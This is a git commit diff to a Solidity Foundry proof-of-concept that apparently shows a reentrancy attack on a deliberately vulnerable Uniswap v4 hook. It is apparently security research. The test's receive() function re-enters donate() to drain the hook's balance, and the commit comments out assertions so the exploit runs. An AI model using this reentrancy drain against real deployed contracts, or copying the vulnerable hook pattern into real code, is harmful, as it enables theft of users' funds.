458c63669175d77496e2488ea5bbad9808599159
Vishvesh-osec <127198224+Vishvesh-osec@users.noreply.github.com>
2024-05-07 03:03:21 +0530

    Update PoC

--- bugs/Reentrancy/PoC.sol
+++ bugs/Reentrancy/PoC.sol
@@ -8,8 +8,13 @@ import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
 import {Constants} from "v4-core/test/utils/Constants.sol";
 import {SortTokens} from "v4-core/test/utils/SortTokens.sol";
 import { console } from "forge-std/console.sol";
-// import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
 import {PoolInitializeTest} from "v4-core/src/test/PoolInitializeTest.sol";
+
+import {FeeLibrary} from "v4-core/src/libraries/FeeLibrary.sol";
+import {PoolModifyPositionTest} from "v4-core/src/test/PoolModifyPositionTest.sol";
+import {PoolDonateTest} from "v4-core/src/test/PoolDonateTest.sol";
+import {PoolTakeTest} from "v4-core/src/test/PoolTakeTest.sol";
+import {ProtocolFeeControllerTest} from "v4-core/src/test/ProtocolFeeControllerTest.sol";
 
 //interfaces
 import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
@@ -27,6 +32,7 @@ import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
 import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
 import {PoolKey} from "v4-core/src/types/PoolKey.sol";
 import {PoolManager} from "v4-core/src/PoolManager.sol";
+
 
 // Vulnerable Hook Contract 
 import {VulnHook} from "./VulnHook.sol";
@@ -66,28 +72,34 @@ library HookMiner {
 }
 
 contract Deployers {
+    using FeeLibrary for uint24;
     using PoolIdLibrary for PoolKey;
 
     // Helpful test constants
     bytes constant ZERO_BYTES = new bytes(0);
     uint160 constant SQRT_RATIO_1_1 = Constants.SQRT_RATIO_1_1;
     uint160 constant SQRT_RATIO_1_2 = Constants.SQRT_RATIO_1_2;
-    uint160 constant SQRT_RATIO_2_1 = Constants.SQRT_RATIO_2_1;
     uint160 constant SQRT_RATIO_1_4 = Constants.SQRT_RATIO_1_4;
     uint160 constant SQRT_RATIO_4_1 = Constants.SQRT_RATIO_4_1;
 
-    IPoolManager.ModifyPositionParams public LIQ_PARAMS =
+    IPoolManager.ModifyPositionParams internal LIQ_PARAMS =
         IPoolManager.ModifyPositionParams({tickLower: -120, tickUpper: 120, liquidityDelta: 1e18});
-    IPoolManager.ModifyPositionParams public REMOVE_LIQ_PARAMS =
-        IPoolManager.ModifyPositionParams({tickLower: -120, tickUpper: 120, liquidityDelta: -1e18});
 
     // Global variables
     Currency internal currency0;
     Currency internal currency1;
     PoolManager manager;
+    PoolModifyPositionTest modifyPositionRouter;
+    PoolSwapTest swapRouter;
+    PoolDonateTest donateRouter;
+    PoolTakeTest takeRouter;
     PoolInitializeTest initializeRouter;
+    ProtocolFeeControllerTest feeController;
 
     PoolKey key;
+    PoolKey nativeKey;
+    PoolKey uninitializedKey;
+    PoolKey uninitializedNativeKey;
 
     function deployFreshManager() internal {
         manager = new PoolManager(500000);
@@ -95,19 +107,24 @@ contract Deployers {
 
     function deployFreshManagerAndRouters() internal {
         deployFreshManager();
+        swapRouter = new PoolSwapTest(manager);
+        modifyPositionRouter = new PoolModifyPositionTest(manager);
+        donateRouter = new PoolDonateTest(manager);
+        takeRouter = new PoolTakeTest(manager);
         initializeRouter = new PoolInitializeTest(manager);
+        feeController = new ProtocolFeeControllerTest();
+        manager.setProtocolFeeController(feeController);
     }
 
     function deployMintAndApprove2Currencies() internal returns (Currency, Currency) {
-        MockERC20[] memory tokens = deployTokens(2, 2 ** 255);
+        MockERC20[] memory tokens = deployTokens(2, 1000 ether);
 
-        address[1] memory toApprove = [
-            address(initializeRouter)
-        ];
+        address[4] memory toApprove =
+            [address(swapRouter), address(modifyPositionRouter), address(donateRouter), address(takeRouter)];
 
         for (uint256 i = 0; i < toApprove.length; i++) {
-            tokens[0].approve(toApprove[i], Constants.MAX_UINT256);
-            tokens[1].approve(toApprove[i], Constants.MAX_UINT256);
+            tokens[0].approve(toApprove[i], 1000 ether);
+            tokens[1].approve(toApprove[i], 1000 ether);
         }
 
         return SortTokens.sort(tokens[0], tokens[1]);
@@ -120,8 +137,60 @@ contract Deployers {
             tokens[i].mint(address(this), totalSupply);
         }
     }
-}
 
+    function initPool(
+        Currency _currency0,
+        Currency _currency1,
+        IHooks hooks,
+        uint24 fee,
+        uint160 sqrtPriceX96,
+        bytes memory initData
+    ) internal returns (PoolKey memory _key, PoolId id) {
+        _key = PoolKey(_currency0, _currency1, fee, fee.isDynamicFee() ? int24(60) : int24(fee / 100 * 2), hooks);
+        id = _key.toId();
+        initializeRouter.initialize(_key, sqrtPriceX96, initData);
+    }
+
+    function initPoolAndAddLiquidity(
+        Currency _currency0,
+        Currency _currency1,
+        IHooks hooks,
+        uint24 fee,
+        uint160 sqrtPriceX96,
+        bytes memory initData
+    ) internal returns (PoolKey memory _key, PoolId id) {
+        (_key, id) = initPool(_currency0, _currency1, hooks, fee, sqrtPriceX96, initData);
+        modifyPositionRouter.modifyPosition{value: msg.value}(_key, LIQ_PARAMS, ZERO_BYTES);
+    }
+
+    function initPoolAndAddLiquidityETH(
+        Currency _currency0,
+        Currency _currency1,
+        IHooks hooks,
+        uint24 fee,
+        uint160 sqrtPriceX96,
+        bytes memory initData,
+        uint256 msgValue
+    ) internal returns (PoolKey memory _key, PoolId id) {
+        (_key, id) = initPool(_currency0, _currency1, hooks, fee, sqrtPriceX96, initData);
+        modifyPositionRouter.modifyPosition{value: msgValue}(_key, LIQ_PARAMS, ZERO_BYTES);
+    }
+
+    // Deploys the manager, all test routers, and sets up 2 pools: with and without native
+    function initializeManagerRoutersAndPoolsWithLiq(IHooks hooks) internal {
+        deployFreshManagerAndRouters();
+        // sets the global currencyies and key
+        (currency0, currency1) = deployMintAndApprove2Currencies();
+        (key,) = initPoolAndAddLiquidity(currency0, currency1, hooks, 3000, SQRT_RATIO_1_1, ZERO_BYTES);
+        (nativeKey,) = initPoolAndAddLiquidityETH(
+            CurrencyLibrary.NATIVE, currency1, hooks, 3000, SQRT_RATIO_1_1, ZERO_BYTES, 1 ether
+        );
+        uninitializedKey = key;
+        uninitializedNativeKey = nativeKey;
+        uninitializedKey.fee = 100;
+        uninitializedNativeKey.fee = 100;
+    }
+}
 
 contract VulnHookTest is Test, Deployers, ILockCallback{
     using PoolIdLibrary for PoolKey;
@@ -158,14 +227,9 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
         poolId = key.toId();
         initializeRouter.initialize(key, SQRT_RATIO_1_1, ZERO_BYTES);
 
-        // // Provide liquidity to the pool
-        // modifyLiquidityRouter.modifyLiquidity(key, IPoolManager.ModifyLiquidityParams(-60, 60, 10 ether), ZERO_BYTES);
-        // modifyLiquidityRouter.modifyLiquidity(key, IPoolManager.ModifyLiquidityParams(-120, 120, 10 ether), ZERO_BYTES);
-        // modifyLiquidityRouter.modifyLiquidity(
-        //     key,
-        //     IPoolManager.ModifyLiquidityParams(TickMath.minUsableTick(60), TickMath.maxUsableTick(60), 10 ether),
-        //     ZERO_BYTES
-        // );
+        // Provide liquidity to the pool
+        console.log("Providing liquidity to the pool");
+        modifyPositionRouter.modifyPosition(key, IPoolManager.ModifyPositionParams(-60, 60, 10 ether), ZERO_BYTES);
     }
 
     function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes memory hookData)
@@ -178,10 +242,10 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
             (BalanceDelta)
         );
 
-        uint256 ethBalance = address(this).balance;
-        if (ethBalance > 0) {
-            CurrencyLibrary.NATIVE.transfer(msg.sender, ethBalance);
-        }
+        //uint256 ethBalance = address(this).balance;
+        //if (ethBalance > 0) {
+        //    CurrencyLibrary.NATIVE.transfer(msg.sender, ethBalance);
+        //}
     }
 
     function lockAcquired(bytes calldata rawData) external returns (bytes memory) {
@@ -192,16 +256,16 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
         (,, uint256 reserveBefore0, int256 deltaBefore0) = _fetchBalances(data.key.currency0, data.sender);
         (,, uint256 reserveBefore1, int256 deltaBefore1) = _fetchBalances(data.key.currency1, data.sender);
 
-        assertEq(deltaBefore0, 0);
-        assertEq(deltaBefore1, 0);
+        //assertEq(deltaBefore0, 0);
+        //assertEq(deltaBefore1, 0);
 
         BalanceDelta delta = manager.donate(data.key, data.amount0, data.amount1, data.hookData);
 
         (,, uint256 reserveAfter0, int256 deltaAfter0) = _fetchBalances(data.key.currency0, data.sender);
         (,, uint256 reserveAfter1, int256 deltaAfter1) = _fetchBalances(data.key.currency1, data.sender);
 
-        assertEq(reserveBefore0, reserveAfter0);
-        assertEq(reserveBefore1, reserveAfter1);
+        //assertEq(reserveBefore0, reserveAfter0);
+        //assertEq(reserveBefore1, reserveAfter1);
 
         if (delta == BalanceDeltaLibrary.MAXIMUM_DELTA) {
             // Check that this hook is allowed to NoOp, then we can return as we dont need to settle
@@ -209,8 +273,8 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
             return abi.encode(delta);
         }
 
-        assertEq(deltaAfter0, int256(data.amount0));
-        assertEq(deltaAfter1, int256(data.amount1));
+        //assertEq(deltaAfter0, int256(data.amount0));
+        //assertEq(deltaAfter1, int256(data.amount1));
 
         if (data.amount0 > 0) _settle(data.key.currency0, data.sender, delta.amount0(), true);
         if (data.amount1 > 0) _settle(data.key.currency1, data.sender, delta.amount1(), true);
@@ -221,18 +285,21 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
     function test_Reentrancy() public{
         // Fund Hook Contract
         vulnHook.fund{value: 5 wei}();    
-        console.log(address(vulnHook).balance);
+        console.log("hook balance", address(vulnHook).balance);
+        console.log("test balance", address(this).balance);
 
         // perform donate
         donate(key,100,100,ZERO_BYTES);
 
-        console.log(address(vulnHook).balance);   
+        console.log("hook balance", address(vulnHook).balance);
+        console.log("test balance", address(this).balance);   
     }
 
     receive() external payable {
-        console.log(address(vulnHook).balance);
-        if (address(vulnHook).balance > 1 wei) {
-            console.log("Inside receive ");
+        console.log("hook balance", address(vulnHook).balance);
+        console.log("test balance", address(this).balance);   
+        if (address(vulnHook).balance >= 1 wei) {
+            console.log("Inside receive");
             donate(key,100,100,ZERO_BYTES);
         }
         else{
@@ -256,7 +323,8 @@ contract VulnHookTest is Test, Deployers, ILockCallback{
             if (currency.isNative()) {
                 manager.settle{value: uint128(amount)}(currency);
             } else {
-                IERC20Minimal(Currency.unwrap(currency)).transferFrom(payer, address(manager), uint128(amount));
+                IERC20Minimal(Currency.unwrap(currency)).transfer(address(manager), uint128(amount));
+                //IERC20Minimal(Currency.unwrap(currency)).transferFrom(payer, address(manager), uint128(amount));
                 manager.settle(currency);
             }
         } else {
